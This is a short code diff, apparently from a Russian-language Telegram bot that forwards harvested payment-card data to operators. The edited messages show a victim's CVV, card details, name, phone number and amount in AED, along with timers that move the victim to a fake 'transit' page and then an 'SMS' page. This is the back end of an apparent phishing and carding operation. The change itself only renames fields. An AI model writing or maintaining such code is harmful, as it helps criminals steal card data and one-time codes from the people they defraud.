@@ -249,9 +249,9 @@ async def send_operator_data(callback: types.CallbackQuery, session_id: str, log
         f"🔒  CVV: {card.get('cvv')}\n\n"
         f"📊 <b>Информация о карте:</b>\n"
         f"{card_info_text}\n\n"
-        f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n"
+        f"👤  Имя: {customer.get('fullName')}\n"
         f"📞  Номер: {customer.get('phone')}\n\n"
-        f"💸  Сумма: {booking.get('total_amount')}.00 AED\n\n"
+        f"💸  Сумма: {customer.get('total_amount')}.00 AED\n\n"
         f"🕒 <b>Таймеры запущены:</b>\n"
         f"• Через 15 сек: Вторая транзитная страница\n"
         f"• Через 30 сек: Страница SMS"
@@ -349,9 +349,9 @@ async def take_from_user(callback: types.CallbackQuery):
         f"🔒  CVV: {card.get('cvv')}\n\n"
         f"📊 <b>Информация о карте:</b>\n"
         f"{card_info_text}\n\n"
-        f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n"
+        f"👤  Имя: {customer.get('fullName')}\n"
         f"📞  Номер: {customer.get('phone')}\n\n"
-        f"💸  Сумма: {booking.get('total_amount')}.00 AED"
+        f"💸  Сумма: {customer.get('total_amount')} AED"
     )
 
     # Отправляем данные новому владельцу
